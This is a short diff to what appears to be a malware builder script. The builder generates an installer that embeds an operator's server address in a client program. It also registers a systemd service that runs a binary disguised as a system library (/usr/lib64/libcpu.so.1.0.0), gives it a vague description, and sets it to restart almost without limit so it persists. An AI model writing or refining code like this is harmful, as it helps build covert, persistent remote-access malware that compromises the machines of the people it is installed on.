@@ -11,6 +11,7 @@ def createInstaller(host):
         print("Creating installer located at ./installer.py...")
         f = open('./client.py', 'r')
         clientConts = f.read()
+        clientConts = clientConts.replace("SERVER = ''", "SERVER = '" + host + "'")
         f.close()
         f = open('./installer.py', 'w')
         
@@ -31,7 +32,7 @@ Description=Stuff 'n things.
 Type=simple
 Restart=on-failure
 Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
-ExecStart=/usr/lib64/libcpu.so.1.0.0 """ + host + """
+ExecStart=/usr/lib64/libcpu.so.1.0.0
 StartLimitInterval=1s
 StartLimitBurst=999
 
